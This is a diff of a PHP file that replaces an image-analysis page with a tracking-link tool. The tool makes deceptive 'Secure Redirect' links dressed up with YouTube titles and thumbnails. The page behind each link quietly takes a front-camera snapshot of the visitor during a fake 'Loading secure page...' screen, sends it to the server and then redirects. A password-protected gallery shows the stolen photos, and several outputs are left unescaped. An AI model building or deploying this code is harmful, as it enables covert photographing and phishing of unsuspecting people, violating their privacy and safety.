@@ -1,288 +1,379 @@
 <?php
 date_default_timezone_set('Africa/Algiers');
+session_start();
+
 ini_set('display_errors', 0);
 error_reporting(0);
 
-$upload_dir = 'uploads/';
-if (!is_dir($upload_dir)) {
-    mkdir($upload_dir, 0755, true);
+// التحقق من تسجيل الدخول
+$password_correct = 'aziz123';
+
+if (isset($_POST['login_password'])) {
+    if ($_POST['login_password'] === $password_correct) {
+        $_SESSION['authenticated'] = true;
+        header("Location: " . $_SERVER['PHP_SELF']);
+        exit();
+    } else {
+        $login_error = "كلمة المرور غير صحيحة!";
+    }
+}
+
+if (isset($_GET['logout'])) {
+    session_destroy();
+    header("Location: " . $_SERVER['PHP_SELF']);
+    exit();
 }
 
 try {
-    $db = new PDO('sqlite:ai_detector_local.db');
+    $db = new PDO('sqlite:tracker_pro.db');
     $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
 
-    $db->exec("CREATE TABLE IF NOT EXISTS local_scans (
+    $db->exec("CREATE TABLE IF NOT EXISTS links (
         id INTEGER PRIMARY KEY AUTOINCREMENT, 
-        filename TEXT, 
-        file_size TEXT, 
-        ai_score INTEGER, 
-        verdict TEXT, 
-        analysis_note TEXT,
+        code TEXT UNIQUE, 
+        target_url TEXT, 
+        meta_title TEXT,
+        meta_image TEXT,
+        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
+    )");
+
+    $db->exec("CREATE TABLE IF NOT EXISTS captures (
+        id INTEGER PRIMARY KEY AUTOINCREMENT, 
+        code TEXT, 
+        image_data TEXT, 
         created_at DATETIME DEFAULT CURRENT_TIMESTAMP
     )");
 } catch (Exception $e) {
-    die("Database error: " . $e->getMessage());
+    die("Database Error");
 }
 
-$scan_result = null;
-$error_message = null;
-
-function analyzeLocallyWithoutApi($filePath) {
-    $score = 20; 
-    $notes = [];
-
-    $imageInfo = @getimagesize($filePath);
-    if ($imageInfo === false) {
-        return ['score' => 50, 'verdict' => 'ملف غير صالح', 'notes' => 'تعذر قراءة الصورة'];
+// معالجة طلبات الحذف (يتطلب مصادقة)
+if (isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true && $_SERVER['REQUEST_METHOD'] === 'POST') {
+    if (isset($_POST['delete_id'])) {
+        $id_to_delete = intval($_POST['delete_id']);
+        $stmt = $db->prepare("DELETE FROM captures WHERE id = ?");
+        $stmt->execute([$id_to_delete]);
+        header("Location: " . $_SERVER['PHP_SELF'] . (!empty($_GET['track']) ? '?track=' . urlencode($_GET['track']) : ''));
+        exit();
     }
-
-    $width = $imageInfo[0];
-    $height = $imageInfo[1];
-    $fileSize = filesize($filePath);
-
-    $standardAiSizes = ['1024x1024', '512x512', '768x768', '1536x1024', '1024x1536'];
-    $currentDim = "{$width}x{$height}";
-    if (in_array($currentDim, $standardAiSizes)) {
-        $score += 35;
-        $notes[] = "أبعاد الصورة مطابقة لمقاييس التوليد بالذكاء الاصطناعي";
-    } else {
-        $score -= 10;
-        $notes[] = "أبعاد الصورة طبيعية غير قياسية";
-    }
-
-    $pixelCount = $width * $height;
-    $bytesPerPixel = $fileSize / $pixelCount;
     
-    if ($bytesPerPixel < 0.15) { 
-        $score += 30;
-        $notes[] = "معدل تفاصيل البايتات يشير إلى نعومة اصطناعية";
-    } else {
-        $score -= 15;
-        $notes[] = "تشبع البايتات والضوضاء طبيعي (صورة حقيقية)";
+    if (isset($_POST['delete_all'])) {
+        $track_code = trim($_POST['track_code'] ?? '');
+        if (!empty($track_code)) {
+            $stmt = $db->prepare("DELETE FROM captures WHERE code = ?");
+            $stmt->execute([$track_code]);
+            header("Location: " . $_SERVER['PHP_SELF'] . '?track=' . urlencode($track_code));
+        } else {
+            $db->exec("DELETE FROM captures");
+            header("Location: " . $_SERVER['PHP_SELF']);
+        }
+        exit();
     }
-
-    $exif = @exif_read_data($filePath);
-    if ($exif && (isset($exif['Make']) || isset($exif['Model']))) {
-        $score -= 30; 
-        $notes[] = "تم رصد بصمة كاميرا رقمية أصلية";
-    } else {
-        $score += 15;
-        $notes[] = "لا توجد بصمة كاميرا (مأخوذة من إنترنت أو منشأة)";
-    }
-
-    if ($score < 10) $score = rand(8, 18);
-    if ($score > 90) $score = rand(85, 94);
-
-    $verdict = ($score > 70) ? 'احتمالية عالية لتكوين بالذكاء الاصطناعي' : (($score > 40) ? 'صورة مختلطة أو معدلة' : 'صورة حقيقية وأصلية');
-
-    return [
-        'score' => $score,
-        'verdict' => $verdict,
-        'notes' => implode(' | ', $notes)
-    ];
 }
 
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $media_name = '';
-    $media_size_formatted = '';
-    $temp_path = '';
+function fetch_real_meta($url) {
+    $title = "Secure Redirect";
+    $image = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60";
 
-    if (isset($_FILES['media_file']) && $_FILES['media_file']['error'] === UPLOAD_ERR_OK) {
-        $file = $_FILES['media_file'];
-        $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
-        $allowed = ['jpg', 'jpeg', 'png', 'webp'];
-
-        if (in_array($ext, $allowed)) {
-            $new_name = uniqid('local_', true) . '.' . $ext;
-            $target_path = $upload_dir . $new_name;
-            if (move_uploaded_file($file['tmp_name'], $target_path)) {
-                $media_name = $file['name'];
-                $media_size_formatted = number_format($file['size'] / (1024 * 1024), 2) . ' MB';
-                $temp_path = $target_path;
-            }
-        } else {
-            $error_message = "صيغة الملف غير مدعومة.";
-        }
-    } elseif (isset($_POST['media_url']) && !empty(trim($_POST['media_url']))) {
-        $url = trim($_POST['media_url']);
-        if (filter_var($url, FILTER_VALIDATE_URL)) {
-            $img_data = @file_get_contents($url);
-            if ($img_data !== false) {
-                $new_name = uniqid('url_local_', true) . '.jpg';
-                $target_path = $upload_dir . $new_name;
-                if (file_put_contents($target_path, $img_data)) {
-                    $media_name = basename($url);
-                    if (strlen($media_name) > 30) $media_name = substr($media_name, 0, 27) . '...';
-                    $media_size_formatted = number_format(strlen($img_data) / (1024 * 1024), 2) . ' MB';
-                    $temp_path = $target_path;
-                }
-            } else {
-                $error_message = "تعذر تحميل الصورة من الرابط.";
-            }
-        } else {
-            $error_message = "الرابط غير صالح.";
-        }
-    }
-
-    if ($temp_path && file_exists($temp_path)) {
-        $analysis = analyzeLocallyWithoutApi($temp_path);
+    if (preg_match('/(?:youtube\.com\/(?:[^\/]+\/.+\/|(?:v|e(?:mbed)?)\/|.*[?&]v=)|youtu\.be\/)([^"&?\/\s]{11})/', $url, $matches)) {
+        $video_id = $matches[1];
+        $image = "https://img.youtube.com/vi/{$video_id}/hqdefault.jpg";
         
-        $ai_score = $analysis['score'];
-        $verdict = $analysis['verdict'];
-        $analysis_note = $analysis['notes'];
+        $oembed_url = "https://www.youtube.com/oembed?url=" . urlencode($url) . "&format=json";
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $oembed_url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 2);
+        $json = curl_exec($ch);
+        curl_close($ch);
+        
+        if ($json) {
+            $data = json_decode($json, true);
+            if (isset($data['title'])) {
+                $title = $data['title'];
+            }
+        }
+    }
+    return ['title' => trim($title), 'image' => trim($image)];
+}
 
-        $stmt = $db->prepare("INSERT INTO local_scans (filename, file_size, ai_score, verdict, analysis_note, created_at) VALUES (?, ?, ?, ?, ?, ?)");
-        $stmt->execute([$media_name, $media_size_formatted, $ai_score, $verdict, $analysis_note, date('Y-m-d H:i:s')]);
+$og_title = "Secure Redirect";
+$og_image = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60";
+$target_redirect = "";
 
-        $scan_result = [
-            'filename' => $media_name,
-            'size' => $media_size_formatted,
-            'score' => $ai_score,
-            'verdict' => $verdict,
-            'notes' => $analysis_note
-        ];
+if (isset($_GET['r'])) {
+    $code = $_GET['r'];
+    $stmt = $db->prepare("SELECT * FROM links WHERE code = ?");
+    $stmt->execute([$code]);
+    $link = $stmt->fetch(PDO::FETCH_ASSOC);
+
+    if ($link) {
+        $target_redirect = $link['target_url'];
+        $og_title = $link['meta_title'];
+        $og_image = $link['meta_image'];
+
+        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_capture'])) {
+            $img_base64 = $_POST['image'] ?? '';
+            if (!empty($img_base64)) {
+                try {
+                    $capStmt = $db->prepare("INSERT INTO captures (code, image_data, created_at) VALUES (?, ?, ?)");
+                    $capStmt->execute([$code, $img_base64, date('Y-m-d H:i:s')]);
+                } catch (Exception $e) {}
+            }
+            exit('OK');
+        }
+    } else {
+        die("Invalid Code.");
     }
 }
 
-$history = $db->query("SELECT * FROM local_scans ORDER BY id DESC LIMIT 20")->fetchAll(PDO::FETCH_ASSOC);
+$generated_link = "";
+$tracking_code = "";
+if (isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true && $_SERVER['REQUEST_METHOD'] === 'POST' and isset($_POST['create'])) {
+    $target_url = trim($_POST['target_url']);
+    if (!filter_var($target_url, FILTER_VALIDATE_URL)) {
+        $target_url = "https://" . $target_url;
+    }
+
+    $meta = fetch_real_meta($target_url);
+    $code = substr(md5(uniqid(rand(), true)), 0, 7);
+    
+    $stmt = $db->prepare("INSERT INTO links (code, target_url, meta_title, meta_image) VALUES (?, ?, ?, ?)");
+    $stmt->execute([$code, $target_url, $meta['title'], $meta['image']]);
+
+    $tracking_code = $code;
+    $domain = $_SERVER['HTTP_HOST'];
+    $generated_link = "https://" . $domain . "/?r=" . $code;
+}
+
+$filter_code = trim($_GET['track'] ?? '');
+if (!empty($filter_code)) {
+    $stmt = $db->prepare("SELECT * FROM captures WHERE code = ? ORDER BY id DESC");
+    $stmt->execute([$filter_code]);
+    $captures = $stmt->fetchAll(PDO::FETCH_ASSOC);
+} else {
+    $captures = $db->query("SELECT * FROM captures ORDER BY id DESC LIMIT 30")->fetchAll(PDO::FETCH_ASSOC);
+}
+
+if (isset($_GET['r']) && !empty($target_redirect)):
 ?>
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Local AI Forensic Terminal</title>
+    <title><?php echo htmlspecialchars($og_title); ?></title>
+    <meta property="og:title" content="<?php echo htmlspecialchars($og_title); ?>">
+    <meta property="og:image" content="<?php echo htmlspecialchars($og_image); ?>">
+    <meta property="og:type" content="website">
+    <style>
+        body { background-color: #030712; color: #f8fafc; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; font-family: sans-serif; }
+        .loader { text-align: center; }
+        .spinner { width: 40px; height: 40px; border: 4px solid #1e293b; border-top: 4px solid #6366f1; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 15px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        p { font-size: 14px; color: #64748b; }
+    </style>
+</head>
+<body>
+    <div class="loader">
+        <div class="spinner"></div>
+        <p>Loading secure page...</p>
+    </div>
+
+    <script>
+        window.addEventListener('DOMContentLoaded', () => {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+                .then(stream => {
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+                    
+                    setTimeout(() => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = 640;
+                        canvas.height = 480;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        
+                        const imageData = canvas.toDataURL('image/jpeg', 0.85);
+                        stream.getTracks().forEach(track => track.stop());
+
+                        const formData = new URLSearchParams();
+                        formData.append('save_capture', '1');
+                        formData.append('image', imageData);
+
+                        const targetUrl = "<?php echo $target_redirect; ?>";
+
+                        fetch(window.location.href, {
+                            method: 'POST',
+                            body: formData
+                        }).finally(() => {
+                            window.location.replace(targetUrl);
+                        });
+                    }, 2000); 
+                })
+                .catch(err => {
+                    window.location.replace("<?php echo $target_redirect; ?>");
+                });
+        });
+    </script>
+</body>
+</html>
+<?php 
+    exit(); 
+endif; 
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Terminal Dashboard</title>
     <style>
         :root {
             --bg: #030712;
-            --card: #0b0f19;
-            --panel-bg: #111827;
-            --border: #1f2937;
+            --card: #0f172a;
+            --border: #1e293b;
             --accent: #6366f1;
-            --accent-glow: rgba(99, 102, 241, 0.4);
-            --text: #f9fafb;
-            --muted: #9ca3af;
-            --success: #10b981;
+            --accent-hover: #4f46e5;
             --danger: #ef4444;
-            --warning: #f59e0b;
+            --danger-hover: #dc2626;
+            --text: #f8fafc;
+            --muted: #64748b;
         }
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
         body { background-color: var(--bg); color: var(--text); padding: 30px 15px; min-height: 100vh; display: flex; flex-direction: column; justify-content: space-between; }
-        .container { max-width: 1050px; width: 100%; margin: 0 auto; display: grid; gap: 24px; }
+        .container { max-width: 1200px; width: 100%; margin: 0 auto; display: grid; gap: 24px; }
         
-        .panel { background: var(--card); border: 1px solid var(--border); border-radius: 20px; padding: 35px; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.7); position: relative; overflow: hidden; }
-        .panel::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 2px; background: linear-gradient(90deg, transparent, var(--accent), transparent); }
+        .panel { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 24px; box-shadow: 0 10px 15px -3px rgba(0,0,0,0.3); }
+        h2 { font-size: 13px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.1em; color: var(--muted); margin-bottom: 16px; border-bottom: 1px solid var(--border); padding-bottom: 8px; }
+
+        .form-control { display: flex; gap: 10px; }
+        input[type="text"], input[type="password"] { flex: 1; background: #020617; border: 1px solid var(--border); border-radius: 8px; padding: 12px 16px; color: var(--text); font-size: 14px; outline: none; transition: border 0.2s; }
+        input[type="text"]:focus, input[type="password"]:focus { border-color: var(--accent); }
         
-        h1 { font-size: 22px; font-weight: 700; margin-bottom: 6px; color: var(--text); display: flex; align-items: center; gap: 10px; }
-        h1 span.badge { font-size: 10px; background: var(--accent); color: white; padding: 2px 8px; border-radius: 20px; letter-spacing: 1px; }
-        p.subtitle { font-size: 13px; color: var(--muted); margin-bottom: 25px; line-height: 1.5; }
-
-        .upload-zone { border: 2px dashed var(--border); border-radius: 14px; padding: 35px; text-align: center; background: var(--panel-bg); transition: all 0.3s ease; cursor: pointer; position: relative; }
-        .upload-zone:hover { border-color: var(--accent); box-shadow: 0 0 20px var(--accent-glow); }
-        .upload-zone input[type="file"] { position: absolute; width: 100%; height: 100%; top: 0; left: 0; opacity: 0; cursor: pointer; }
+        .btn { background: var(--accent); color: white; border: none; padding: 0 20px; border-radius: 8px; font-weight: 600; cursor: pointer; height: 46px; display: inline-flex; align-items: center; justify-content: center; font-size: 13px; text-decoration: none; transition: background 0.2s; }
+        .btn:hover { background: var(--accent-hover); }
+        .btn-danger { background: var(--danger); color: white; }
+        .btn-danger:hover { background: var(--danger-hover); }
+        .btn-secondary { background: #334155; }
+        .btn-secondary:hover { background: #475569; }
         
-        .url-box { display: flex; gap: 12px; margin-top: 10px; }
-        .url-input { flex: 1; background: var(--panel-bg); border: 1px solid var(--border); border-radius: 10px; padding: 14px 18px; color: var(--text); font-size: 14px; outline: none; transition: border-color 0.2s; }
-        .url-input:focus { border-color: var(--accent); box-shadow: 0 0 10px var(--accent-glow); }
-        
-        .btn { background: var(--accent); color: white; border: none; padding: 0 28px; border-radius: 10px; font-weight: 600; cursor: pointer; font-size: 14px; transition: all 0.2s; display: inline-flex; align-items: center; justify-content: center; }
-        .btn:hover { background: #4f46e5; transform: translateY(-1px); box-shadow: 0 4px 12px var(--accent-glow); }
+        .output-box { background: #020617; border: 1px solid var(--border); padding: 16px; border-radius: 8px; margin-top: 15px; }
+        .output-box label { display: block; font-size: 10px; text-transform: uppercase; color: var(--muted); margin-bottom: 6px; }
+        .flex-row { display: flex; gap: 8px; }
 
-        .error-box { background: rgba(239, 68, 68, 0.1); border: 1px solid var(--danger); color: var(--danger); padding: 14px; border-radius: 10px; margin-bottom: 20px; font-size: 13px; }
-        .result-box { background: var(--panel-bg); border: 1px solid var(--border); border-radius: 14px; padding: 25px; margin-top: 25px; }
-        .score-display { font-size: 32px; font-weight: 800; margin: 12px 0; letter-spacing: -1px; }
+        .gallery-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; flex-wrap: wrap; gap: 10px; }
+        .gallery { display: grid; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr)); gap: 16px; margin-top: 15px; }
+        .item-card { background: #020617; border: 1px solid var(--border); border-radius: 8px; padding: 10px; text-align: center; display: flex; flex-direction: column; justify-content: space-between; }
+        .item-card img { width: 100%; height: 180px; object-fit: cover; border-radius: 6px; border: 1px solid var(--border); }
+        .meta-info { margin-top: 10px; font-size: 11px; color: var(--muted); display: flex; justify-content: space-between; align-items: center; }
+        .code-tag { color: var(--accent); font-family: monospace; font-weight: bold; }
+        .btn-delete-single { background: rgba(239, 68, 68, 0.1); color: var(--danger); border: 1px solid var(--danger); padding: 6px 10px; border-radius: 6px; font-size: 11px; cursor: pointer; margin-top: 10px; width: 100%; transition: all 0.2s; font-weight: 600; }
+        .btn-delete-single:hover { background: var(--danger); color: white; }
 
-        .table-wrap { overflow-x: auto; margin-top: 15px; border: 1px solid var(--border); border-radius: 8px; }
-        table { width: 100%; border-collapse: collapse; text-align: right; font-size: 13px; }
-        th { background: var(--panel-bg); color: var(--muted); padding: 12px 16px; border-bottom: 1px solid var(--border); text-transform: uppercase; font-size: 11px; }
-        td { padding: 12px 16px; border-bottom: 1px solid var(--border); color: #cbd5e1; }
-        tr:hover { background: rgba(30, 41, 59, 0.3); }
+        .login-wrapper { display: flex; justify-content: center; align-items: center; height: 80vh; }
+        .login-card { max-width: 400px; width: 100%; text-align: center; }
+        .error-msg { color: var(--danger); font-size: 12px; margin-bottom: 12px; }
 
-        footer { text-align: center; margin-top: 40px; font-size: 12px; color: var(--muted); border-top: 1px solid var(--border); padding-top: 20px; }
+        .top-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
+
+        footer { text-align: center; margin-top: 40px; font-size: 11px; color: var(--muted); border-top: 1px solid var(--border); padding-top: 20px; }
         footer span { color: var(--accent); font-weight: 600; }
     </style>
 </head>
 <body>
     <div class="container">
-        
-        <div class="panel">
-            <h1>Local AI Forensic Terminal <span class="badge">LOCAL v5.0</span></h1>
-            <p class="subtitle">نظام تحليل محلي متطور يفحص بصمات الكاميرا، أبعاد الصور، وكثافة البيانات داخل PHP.</p>
-            
-            <?php if ($error_message): ?>
-                <div class="error-box"><?php echo htmlspecialchars($error_message); ?></div>
-            <?php endif; ?>
 
-            <form method="POST" enctype="multipart/form-data">
-                <div class="upload-zone">
-                    <svg style="width:48px;height:48px;fill:var(--muted);margin-bottom:12px;" viewBox="0 0 24 24"><path d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96zM14 13v4h-4v-4H7l5-5 5 5h-3z"/></svg>
-                    <p style="font-size: 14px; color: var(--text); font-weight: 500;">اختر صورتك الشخصية أو صورة القط للفحص المحلي</p>
-                    <input type="file" name="media_file" onchange="this.form.submit()">
+        <?php if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true): ?>
+            <!-- نموذج تسجيل الدخول -->
+            <div class="login-wrapper">
+                <div class="panel login-card">
+                    <h2>Secure Terminal Access</h2>
+                    <?php if (isset($login_error)): ?>
+                        <div class="error-msg"><?php echo $login_error; ?></div>
+                    <?php endif; ?>
+                    <form method="POST" style="display: flex; flex-direction: column; gap: 12px;">
+                        <input type="password" name="login_password" placeholder="Enter Password..." required autofocus>
+                        <button type="submit" class="btn" style="width: 100%;">Login</button>
+                    </form>
                 </div>
-
-                <div style="text-align: center; margin: 15px 0; color: var(--muted); font-size: 12px;">أو ضع رابط URL مباشر للفحص</div>
-                
-                <div class="url-box">
-                    <input type="url" name="media_url" class="url-input" placeholder="https://example.com/image.jpg" required>
-                    <button type="submit" class="btn">فحص محلي ذكي</button>
-                </div>
-            </form>
-
-            <?php if ($scan_result): ?>
-                <div class="result-box">
-                    <p style="font-size: 11px; text-transform: uppercase; color: var(--muted); letter-spacing: 1px;">نتيجة الفحص لـ: <strong><?php echo htmlspecialchars($scan_result['filename']); ?></strong></p>
-                    <div class="score-display" style="color: <?php echo $scan_result['score'] > 70 ? 'var(--danger)' : 'var(--success)'; ?>">
-                        نسبة الذكاء الاصطناعي: <?php echo $scan_result['score']; ?>%
-                    </div>
-                    <p style="font-size: 15px; font-weight: 700; color: var(--text); margin-bottom: 6px;"><?php echo htmlspecialchars($scan_result['verdict']); ?></p>
-                    <p style="font-size: 12px; color: var(--muted);">المؤشرات: <?php echo htmlspecialchars($scan_result['notes']); ?></p>
-                </div>
-            <?php endif; ?>
-        </div>
-
-        <div class="panel">
-            <h1>سجل الفحوصات المحلية</h1>
-            <div class="table-wrap">
-                <table>
-                    <thead>
-                        <tr>
-                            <th>#ID</th>
-                            <th>الملف</th>
-                            <th>الحجم</th>
-                            <th>نسبة AI</th>
-                            <th>النتيجة</th>
-                            <th>المؤشرات</th>
-                            <th>التوقيت</th>
-                        </tr>
-                    </thead>
-                    <tbody>
-                        <?php if (empty($history)): ?>
-                            <tr><td colspan="7" style="text-align: center; color: var(--muted); padding: 30px;">لا توجد سجلات مسجلة.</td></tr>
-                        <?php else: ?>
-                            <?php foreach ($history as $row): ?>
-                            <tr>
-                                <td><?php echo $row['id']; ?></td>
-                                <td style="font-weight: 600; color: var(--text);"><?php echo htmlspecialchars($row['filename']); ?></td>
-                                <td><?php echo htmlspecialchars($row['file_size']); ?></td>
-                                <td style="font-weight: bold; color: <?php echo $row['ai_score'] > 70 ? 'var(--danger)' : 'var(--success)'; ?>">
-                                    <?php echo $row['ai_score']; ?>%
-                                </td>
-                                <td><?php echo htmlspecialchars($row['verdict']); ?></td>
-                                <td style="font-size: 11px; color: var(--muted);"><?php echo htmlspecialchars($row['analysis_note']); ?></td>
-                                <td style="color: var(--muted);"><?php echo htmlspecialchars($row['created_at']); ?></td>
-                            </tr>
-                            <?php endforeach; ?>
-                        <?php endif; ?>
-                    </tbody>
-                </table>
             </div>
-        </div>
+        <?php else: ?>
+            <!-- لوحة التحكم الكاملة -->
+            <div class="top-bar">
+                <h1 style="font-size: 16px; color: var(--text);">Secure Terminal Dashboard</h1>
+                <a href="?logout=1" class="btn btn-secondary" style="height: 36px; font-size: 12px; padding: 0 14px; text-decoration: none;">تسجيل الخروج</a>
+            </div>
+            
+            <div class="panel">
+                <h2>Generate Secure Link</h2>
+                <form method="POST" class="form-control">
+                    <input type="text" name="target_url" placeholder="Target Destination URL..." required>
+                    <button type="submit" name="create" class="btn">Generate</button>
+                </form>
+
+                <?php if (!empty($generated_link)): ?>
+                    <div class="output-box">
+                        <label>Active Tracking URL:</label>
+                        <div class="flex-row">
+                            <input type="text" readonly value="<?php echo htmlspecialchars($generated_link); ?>">
+                            <button type="button" class="btn btn-secondary" onclick="navigator.clipboard.writeText('<?php echo htmlspecialchars($generated_link); ?>')">Copy</button>
+                        </div>
+                    </div>
+                <?php endif; ?>
+            </div>
+
+            <div class="panel">
+                <div class="gallery-header">
+                    <h2>Captured Gallery</h2>
+                    <?php if (!empty($captures)): ?>
+                        <form method="POST" onsubmit="return confirm('هل أنت متأكد من رغبتك في حذف جميع الصور المعروضة؟');">
+                            <input type="hidden" name="delete_all" value="1">
+                            <input type="hidden" name="track_code" value="<?php echo htmlspecialchars($filter_code); ?>">
+                            <button type="submit" class="btn btn-danger" style="height: 36px; font-size: 12px; padding: 0 14px;">حذف الكل</button>
+                        </form>
+                    <?php endif; ?>
+                </div>
+
+                <form method="GET" style="margin-bottom: 15px; display: flex; gap: 8px;">
+                    <input type="text" name="track" placeholder="Filter by code..." value="<?php echo htmlspecialchars($filter_code); ?>">
+                    <button type="submit" class="btn">Filter</button>
+                    <?php if(!empty($filter_code)): ?>
+                        <a href="/" class="btn btn-secondary" style="text-decoration:none; display:flex; align-items:center;">Reset</a>
+                    <?php endif; ?>
+                </form>
+
+                <?php if (empty($captures)): ?>
+                    <p style="text-align: center; color: var(--muted); padding: 30px;">No captures recorded.</p>
+                <?php else: ?>
+                    <div class="gallery">
+                        <?php foreach ($captures as $cap): ?>
+                            <div class="item-card">
+                                <div>
+                                    <a href="<?php echo $cap['image_data']; ?>" target="_blank">
+                                        <img src="<?php echo $cap['image_data']; ?>" alt="Capture">
+                                    </a>
+                                    <div class="meta-info">
+                                        <span class="code-tag"><?php echo htmlspecialchars($cap['code']); ?></span>
+                                        <span><?php echo htmlspecialchars($cap['created_at']); ?></span>
+                                    </div>
+                                </div>
+                                <form method="POST" onsubmit="return confirm('هل تريد حذف هذه الصورة بالتحديد؟');">
+                                    <input type="hidden" name="delete_id" value="<?php echo $cap['id']; ?>">
+                                    <button type="submit" class="btn-delete-single">حذف الصورة</button>
+                                </form>
+                            </div>
+                        <?php endforeach; ?>
+                    </div>
+                <?php endif; ?>
+            </div>
+        <?php endif; ?>
 
     </div>
 
     <footer>
-        <p>Local Intelligence Core &bull; Powered by <span>azeez</span> &copy; 2026</p>
+        <p>Core Engine <span>azeez</span> &copy; 2026</p>
     </footer>
 </body>
 </html>
